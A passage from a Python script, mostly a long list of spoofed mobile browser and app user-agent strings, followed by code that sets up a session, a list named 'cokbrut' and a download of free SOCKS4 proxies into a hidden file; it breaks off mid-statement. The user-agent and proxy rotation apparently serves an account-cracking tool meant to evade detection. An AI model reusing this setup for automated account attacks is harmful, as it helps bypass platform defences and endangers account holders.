Mobile Safari\/537.36","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.13.110-2019112819 UWS\/2.15.0.4 Mobile Safari\/537.36 [ip:151.38.9.127]","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.13.110-2019112819 UWS\/2.15.0.4 Mobile Safari\/537.36 [ip:151.82.158.254]","Mozilla\/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/57.0.2987.108 MZBrowser\/7.13.110-2019112819 UWS\/2.15.0.4 Mobile Safari\/537.36 [ip:151.34.48.31]"]
ugen=['Mozilla/5.0 (Linux; Android 6.0.1; SM-G610M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungexynos7870; pt_BR; 103516666','Mozilla/5.0 (Linux; Android 7.0; SM-J530FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 320dpi; 720x1280; samsung; SM-J530FM; j5y17lte; samsungexynos7870; ru_RU; 104766893', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 Instagram 41.0.0.14.90 (iPhone7,2; iOS 11_2_1; en_UA; en-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (Linux; Android 5.1; M3s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (22/5.1; 320dpi; 720x1280; Meizu; M3s; M3s; mt6755; uk_UA; 102221279)', 
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1713 Build/L860X) NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4210.57 Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.7.0.7'
'Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWetbKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53'
'Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; ru_RU; 104766900)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 43.0.0.13.91 (iPhone5,1; iOS 10_3_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone8,2; iOS 11_3; de_DE; de-DE; scale=2.88; gamut=normal; 1080x1920)', 
'Mozilla/5.0 (Linux; Android 6.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (23/6.0; 480dpi; 1794x1080; HUAWEI; EVA-L09; HWEVA; hi3650; uk_UA; 104766900)', 
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895; ru_RU; 104766900)', 
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (23/6.0.1; 320dpi; 1280x720; samsung; SM-J500H; j53g; qcom; en_GB; 102221278)', 
'Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (22/5.1; 480dpi; 1080x1920; Meizu; m3 note; m3note; mt6755; ru_RU; 103516666)', 
'Mozilla/5.0 (Linux; Android 5.1.1; SM-T331 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1.1; 213dpi; 1280x800; samsung; SM-T331; millet3g; qcom; ru_RU; 104766888)', 
'Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 Instagram 27.0.0.11.97 Android (22/5.1.1; 320dpi; 720x1280; Xiaomi; Redmi 3; ido; qcom; ru_RU)', 
'Mozilla/5.0 (Linux; Android 7.0; Lenovo P2a42 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 39.0.0.19.93 Android (24/7.0; 480dpi; 1080x1776; LENOVO/Lenovo; Lenovo P2a42; P2a42; qcom; uk_UA; 100986894)', 
'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo S660 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (19/4.4.2; 240dpi; 540x960; Lenovo; Lenovo S660; S660; mt6582; ru_RU; 103516653)', 
'Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 103516666)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880; ru_RU; 104766900)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone9,3; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (Linux; Android 4.4.4; E2115 Build/24.0.B.5.14) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (19/4.4.4; 240dpi; 540x904; Sony; E2115; E2115; mt6582; ru_RU; 104766888)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 41.0.0.14.90 (iPhone6,1; iOS 11_2_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1; 320dpi; 720x1184; HUAWEI; HUAWEI TIT-U02; HWTIT-U6582; mt6582; ru_RU; 104766893)', 
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895; uk_UA; 105842053)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone10,6; iOS 11_3; ru_DE; ru-DE; scale=3.00; gamut=wide; 1125x2436)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-C7000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-C7000; c7ltechn; qcom; uk_UA; 104766900)', 
'Mozilla/5.0 (Linux; Android 7.0; SLA-L22 Build/HUAWEISLA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 320dpi; 720x1208; HUAWEI; SLA-L22; HWSLA-Q; qcom; ru_UA; 104766893)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone9,4; iOS 11_3; ru_UA; ru-UA; scale=2.61; gamut=wide; 1080x1920)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 40.0.0.9.95 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone8,1; iOS 11_3; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880; uk_UA; 104766900)', 
'Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 Instagram 33.0.0.11.92 Android (21/5.0.1; 480dpi; 1080x1920; samsung; GT-I9500; ja3g; universal5410; en_US; 93117670)', 
'Mozilla/5.0 (Linux; Android 8.0.0; HTC U11 Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (26/8.0.0; 408dpi; 1080x1920; HTC/htc; HTC U11; htc_ocndugl; htc_ocn; ru_RU; 104766900)', 
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (25/7.1.2; 320dpi; 720x1280; Xiaomi; Redmi 4A; rolex; qcom; ru_RU; 104766893)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 43.0.0.13.91 (iPhone9,1; iOS 10_3_3; ru_UA; ru; scale=2.00; gamut=wide; 750x1334)', 
'Mozilla/5.0 (Linux; Android 7.0; Moto G (4) Build/NPJS25.93-14-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1776; motorola; Moto G (4); athene; qcom; ru_RU; 104766900)', 
'Mozilla/5.0 (Linux; Android 6.0; U10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (23/6.0; 320dpi; 720x1280; Meizu; U10; U10; mt6755; en_US; 102221279)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 Instagram 43.0.0.13.91 (iPhone8,2; iOS 11_3_1; ru_UA; ru-UA; scale=2.88; gamut=normal; 1080x1920)', 
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo S660 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 42.0.0.19.95 Android (17/4.2.2; 240dpi; 540x960; Lenovo; Lenovo S660; S660; mt6582; ru_RU; 104766888)', 
'Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; Lenovo A706_ROW Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 43.0.0.10.97 Android (16/4.1.2; 240dpi; 854x480; LENOVO/Lenovo; Lenovo A706_ROW; armani_row; qcom; ru_RU; 105842050)', 
'Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (23/6.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo A7010a48; A7010a48; mt6735; uk_UA; 104766900)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A510F; a5xelte; samsungexynos7580; ru_RU; 104766900)', 
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (25/7.1.2; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi 5 Plus; vince; qcom; ru_RU; 105842053)', 
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-J320H; j3x3g; sc8830; ru_RU; 104766893)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 38.0.0.7.96 (iPhone7,2; iOS 10_3_2; uk_UA; uk-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 Instagram 41.0.0.14.90 (iPhone8,1; iOS 10_2_1; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G920F; zeroflte; samsungexynos7420; ru_RU; 104766900)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 33.0.0.11.96 (iPhone8,4; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (25/7.1.2; 320dpi; 720x1280; Xiaomi; Redmi 5A; riva; qcom; uk_UA; 105842051)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 Instagram 43.0.0.13.91 (iPhone10,3; iOS 11_3_1; ru_UA; ru-UA; scale=3.00; gamut=wide; 1125x2436)', 
'Mozilla/5.0 (Linux; Android 5.1; m2 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (22/5.1; 320dpi; 720x1280; Meizu; m2; m2; mt6735; uk_UA; 102221279)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-J730FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730FM; j7y17lte; samsungexynos7870; ru_RU; 104766900)', 
'Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 104766900)',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.0.3.2', 
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5', 
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3263) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'Mozilla/5.0 (X11; 10; Linux x86_64)E219Y)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.082.0.4655.104Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]',
'Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 9 Pro Max Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.7-gn',
'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]',
'Mozilla/5.0 (Linux; Android 12; V2110 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]',
'Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]', 
'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B724L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4495.118 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-D636K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4391.69 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4.2-gn',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36', 
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1', 
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1', 
'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1', 
'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3', 
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Xperia X Compact) AppleWebKit/537.36 (KHTML, Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36']
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
